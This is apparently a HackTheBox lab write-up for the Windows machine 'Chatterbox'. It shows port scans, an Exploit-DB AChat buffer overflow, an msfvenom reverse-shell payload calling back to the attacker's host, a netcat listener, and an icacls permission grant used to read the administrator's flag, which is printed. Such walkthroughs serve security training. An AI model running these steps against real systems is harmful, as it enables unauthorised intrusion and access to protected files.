---
title: Chatterbox
categories: [HackTheBox]
tags: [Buffer Overflow, PrivEsc, Public Exploit, Windows, icacls]
img_path: /Vulnhub-Files/img/
image:
  path: Chatterbox/Untitled.png
  alt: Windows Easy level Machine 📂 ...---



## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Chatterbox]
└─$ nmap -sC -sV -p- -T5 -oN Nmap_Result.txt -Pn 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.24s latency).
Not shown: 65409 closed tcp ports (reset), 115 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  tcpwrapped
9256/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-04T15:20:03-05:00
|_clock-skew: mean: 6h40m05s, deviation: 2h53m14s, median: 5h00m03s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-01-04T20:20:01
|_  start_date: 2024-01-04T20:05:04
```

## Public Exploit Enumeration ⤵️

I got this port `9255`,`9256` open so I started doing service version scan through nmap and got →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Chatterbox]
└─$ sudo nmap -sV -p 9255,9256 10.10.10.74                        

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
9256/tcp open  achat   AChat chat system
```

Now I searched online related to this exploit and got it →

![Untitled](Chatterbox/Untitled%201.png)

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Chatterbox]
└─$ cp /usr/share/exploitdb/exploits/windows/remote/36025.py achat.py
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/HTB/Chatterbox]
└─$ open achat.py
```

It is basically performing buffer overflow attack and I need to have latest payload modified from attacker machine to execute it →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Chatterbox]
└─$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.16.29 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3822 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
...
...
```

Now I replaced the payload along with `server_address = ('10.10.10.74', 9256)` with victim machine IP address and started listener on port 4444 .

```powershell
┌──(kali㉿kali)-[~/Downloads/HTB/Chatterbox]
└─$ rlwrap nc -lvnp 4444                                 
listening on [any] 4444 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>
C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>hostname
hostname
Chatterbox

C:\Windows\system32>cd C:\Users\Alfred
cd C:\Users\Alfred
C:\Users\Alfred>tree /f /a
tree /f /a
Folder PATH listing
Volume serial number is 00000200 502F:F304
C:.
+---Contacts
|       Alfred.contact
|       
+---Desktop
|       user.txt
|       
+---Documents
+---Downloads
|       MSEInstall.exe
|       
+---Favorites
|   +---Links
|   |       Suggested Sites.url
|   |       Web Slice Gallery.url
|   |       
|   +---Links for United States
|   |       GobiernoUSA.gov.url
|   |       USA.gov.url
|   |       
|   +---Microsoft Websites
|   |       IE Add-on site.url
|   |       IE site on Microsoft.com.url
|   |       Microsoft At Home.url
|   |       Microsoft At Work.url
|   |       Microsoft Store.url
|   |       
|   +---MSN Websites
|   |       MSN Autos.url
|   |       MSN Entertainment.url
|   |       MSN Money.url
|   |       MSN Sports.url
|   |       MSN.url
|   |       MSNBC News.url
|   |       
|   \---Windows Live
|           Get Windows Live.url
|           Windows Live Gallery.url
|           Windows Live Mail.url
|           Windows Live Spaces.url
|           
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       RecentPlaces.lnk
|       
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

C:\Users\Alfred>
```

Now I ran winpeas in this box and got this password →

![Untitled](Chatterbox/Untitled%202.png)

Also I got to know that I as a Alfred user have `All Access` in Administrators account →

```powershell
C:\Users\Administrator>tree /f /a
tree /f /a
Folder PATH listing
Volume serial number is 00000072 502F:F304
C:.
+---Contacts
|       Administrator.contact
|       
+---Desktop
|       root.txt
|       
+---Documents
+---Downloads
|   |   IE11-Windows6.1-x86-en-us.exe
|   |   SDelete.zip
|   |   
|   \---SDelete
|           Eula.txt
|           sdelete.exe
|           sdelete64.exe
|           sdelete64a.exe
|           
+---Favorites
|   +---Links
|   |       Suggested Sites.url
|   |       Web Slice Gallery.url
|   |       
|   +---Links for United States
|   |       GobiernoUSA.gov.url
|   |       USA.gov.url
|   |       
|   +---Microsoft Websites
|   |       IE Add-on site.url
|   |       IE site on Microsoft.com.url
|   |       Microsoft At Home.url
|   |       Microsoft At Work.url
|   |       Microsoft Store.url
|   |       
|   +---MSN Websites
|   |       MSN Autos.url
|   |       MSN Entertainment.url
|   |       MSN Money.url
|   |       MSN Sports.url
|   |       MSN.url
|   |       MSNBC News.url
|   |       
|   \---Windows Live
|           Get Windows Live.url
|           Windows Live Gallery.url
|           Windows Live Mail.url
|           Windows Live Spaces.url
|           
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       RecentPlaces.lnk
|       
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

C:\Users\Administrator>type Desktop\root.txt
type Desktop\root.txt
Access is denied.

C:\Users\Administrator>icacls Desktop\root.txt
icacls Desktop\root.txt
Desktop\root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>
```

Since root.txt file have only permission from Administrator so the user Alfred can’t open it but user Alfred can change the permissions of this file also like this →

```powershell
C:\Users\Administrator>icacls C:\Users\Administrator\Desktop\root.txt /grant alfred:f
icacls C:\Users\Administrator\Desktop\root.txt /grant alfred:f
processed file: C:\Users\Administrator\Desktop\root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>icacls Desktop\root.txt
icacls Desktop\root.txt
Desktop\root.txt CHATTERBOX\Alfred:(F)
                 CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>type Desktop\root.txt
type Desktop\root.txt
7cef4d0a2785f9b4a8404d1c30f6a0a7

C:\Users\Administrator>
```

I am Administrator Now as I have full access !!